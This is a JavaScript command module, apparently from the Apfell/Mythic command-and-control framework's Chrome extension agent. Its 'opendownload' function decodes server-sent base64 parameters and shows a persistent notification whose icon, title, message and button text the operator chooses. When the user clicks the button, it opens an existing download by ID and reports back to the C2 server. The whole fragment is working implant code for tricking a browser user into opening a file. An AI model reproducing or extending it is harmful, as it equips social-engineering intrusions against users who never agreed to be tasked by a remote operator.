opendownload = function(params) {
    let args = JSON.parse(atob(params['data'].toString()));
    const id = Math.round(args["downloadid"]);
    let icon = chrome.extension.getURL(args["iconURL"]);
    let message = args["message"];
    let buttonText = args["buttonText"];
    let title = args["title"];
    let taskid = params['taskid'];
    let tasktype = params['tasktype'];
    let buttons = [{"title": buttonText}];
    let options = { type: "basic", iconUrl: icon, title: title, message: message, requireInteraction: true, buttons: buttons };
    chrome.notifications.create(options, function(notificationID) {
        chrome.notifications.onButtonClicked.addListener(function(notificationIDa, bIndex) {
            if(notificationID === notificationIDa) {
                chrome.downloads.open(id);
                const opened = btoa(unescape(encodeURIComponent(JSON.stringify({'status': 'opened download with ID: ' + id}, null, 2))));
                const apfellmsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, started.length, taskid, tasktype, opened);
                let meta = {};
                meta["metatype"] = 3;
                meta["metadata"] = apfellmsg;
                const metaenvelope = JSON.stringify(meta);
                out.push(metaenvelope);
            }
        });
    });
};

C2.commands[opendownload.name] = opendownload;
COMMAND_ENDS_HERE